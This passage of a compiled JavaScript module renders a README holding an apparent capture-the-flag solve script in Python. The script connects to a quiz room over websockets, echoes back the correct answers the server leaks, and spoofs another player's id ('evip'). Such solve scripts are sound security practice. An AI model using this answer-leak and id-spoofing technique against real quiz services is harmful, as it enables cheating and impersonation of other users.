response `),n("span",{class:"token operator"},"="),s(" requests"),n("span",{class:"token punctuation"},"."),s("post"),n("span",{class:"token punctuation"},"("),s("url"),n("span",{class:"token punctuation"},")"),s(`
h2_element `),n("span",{class:"token operator"},"="),s(" BeautifulSoup"),n("span",{class:"token punctuation"},"("),s("response"),n("span",{class:"token punctuation"},"."),s("text"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token string"},'"html.parser"'),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("find"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"h2"'),n("span",{class:"token punctuation"},")"),s(`
room_id `),n("span",{class:"token operator"},"="),s(" h2_element"),n("span",{class:"token punctuation"},"."),s("text"),n("span",{class:"token punctuation"},"."),s("split"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"' | '"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"["),n("span",{class:"token operator"},"-"),n("span",{class:"token number"},"1"),n("span",{class:"token punctuation"},"]"),s(`
`),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'room_id: '"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},")"),s(`
requests`),n("span",{class:"token punctuation"},"."),s("get"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},"f'https://"),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("HOST"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"/room/"),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("room_id"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"'")]),n("span",{class:"token punctuation"},")"),s(`

ws_url `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},"f'wss://"),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("HOST"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"/room/"),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("room_id"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"'")]),s(`
ws `),n("span",{class:"token operator"},"="),s(" create_connection"),n("span",{class:"token punctuation"},"("),s("ws_url"),n("span",{class:"token punctuation"},")"),s(`
result `),n("span",{class:"token operator"},"="),s(" ws"),n("span",{class:"token punctuation"},"."),s("recv"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`

`),n("span",{class:"token keyword"},"for"),s(" i"),n("span",{class:"token punctuation"},","),s(" q "),n("span",{class:"token keyword"},"in"),s(),n("span",{class:"token builtin"},"enumerate"),n("span",{class:"token punctuation"},"("),s("kahoot"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'questions'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    data `),n("span",{class:"token operator"},"="),s(" ws"),n("span",{class:"token punctuation"},"."),s("recv"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
    data `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("loads"),n("span",{class:"token punctuation"},"("),s("b64decode"),n("span",{class:"token punctuation"},"("),s("data"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("decode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
    res `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("dumps"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"{"),s(`
        `),n("span",{class:"token string"},"'send_time'"),n("span",{class:"token punctuation"},":"),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'send_time'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'answer'"),n("span",{class:"token punctuation"},":"),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'answer'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},":"),s(` uid
    `),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),s(`
    ws`),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("res"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`

result `),n("span",{class:"token operator"},"="),s(" ws"),n("span",{class:"token punctuation"},"."),s("recv"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`

ws_url `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},"f'wss://"),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("HOST"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"/room/"),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("room_id"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"'")]),s(`
ws `),n("span",{class:"token operator"},"="),s(" create_connection"),n("span",{class:"token punctuation"},"("),s("ws_url"),n("span",{class:"token punctuation"},")"),s(`
result `),n("span",{class:"token operator"},"="),s(" ws"),n("span",{class:"token punctuation"},"."),s("recv"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`

`),n("span",{class:"token keyword"},"for"),s(" i"),n("span",{class:"token punctuation"},","),s(" q "),n("span",{class:"token keyword"},"in"),s(),n("span",{class:"token builtin"},"enumerate"),n("span",{class:"token punctuation"},"("),s("kahoot"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'questions'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    data `),n("span",{class:"token operator"},"="),s(" ws"),n("span",{class:"token punctuation"},"."),s("recv"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
    data `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("loads"),n("span",{class:"token punctuation"},"("),s("b64decode"),n("span",{class:"token punctuation"},"("),s("data"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("decode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token keyword"},"if"),s(" i "),n("span",{class:"token operator"},"=="),s(),n("span",{class:"token number"},"0"),n("span",{class:"token punctuation"},":"),s(`
        uid `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string"},"'dummy'"),s(`
    `),n("span",{class:"token keyword"},"else"),n("span",{class:"token punctuation"},":"),s(`
        uid `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string"},"'evip'"),s(`
    res `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("dumps"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"{"),s(`
        `),n("span",{class:"token string"},"'send_time'"),n("span",{class:"token punctuation"},":"),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'send_time'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'answer'"),n("span",{class:"token punctuation"},":"),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'answer'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},":"),s(` uid
    `),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),s(`
    ws`),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("res"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`

result `),n("span",{class:"token operator"},"="),s(" ws"),n("span",{class:"token punctuation"},"."),s("recv"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"Received:"'),n("span",{class:"token punctuation"},","),s(" b64decode"),n("span",{class:"token punctuation"},"("),s("result"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
`)])])],-1),y=[w],E={},C="",m=o({__name:"README",setup(B,{expose:t}){return t({frontmatter:{},excerpt:void 0}),(f,F)=>(u(),e("div",g,y))}}),a={};typeof a=="function"&&a(m);export{m as default,C as excerpt,E as frontmatter};
